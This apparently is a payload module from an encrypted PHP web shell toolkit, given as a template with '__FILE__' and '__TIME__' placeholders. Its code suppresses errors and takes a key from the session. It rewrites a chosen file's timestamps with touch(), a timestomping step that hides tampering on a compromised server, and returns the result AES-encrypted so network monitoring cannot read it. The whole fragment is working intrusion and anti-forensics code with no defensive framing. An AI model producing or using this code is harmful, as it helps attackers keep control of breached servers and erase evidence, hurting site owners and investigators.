
error_reporting(0);
$key = $_SESSION['key'];
session_write_close();
$file = base64_decode('__FILE__');
$time = strtotime('__TIME__');
$data = array(
    "file" => $file,
    "status" => touch($file, $time, $time),
);
echo openssl_encrypt(base64_encode(json_encode($data)), "aes-256-ecb", $key);
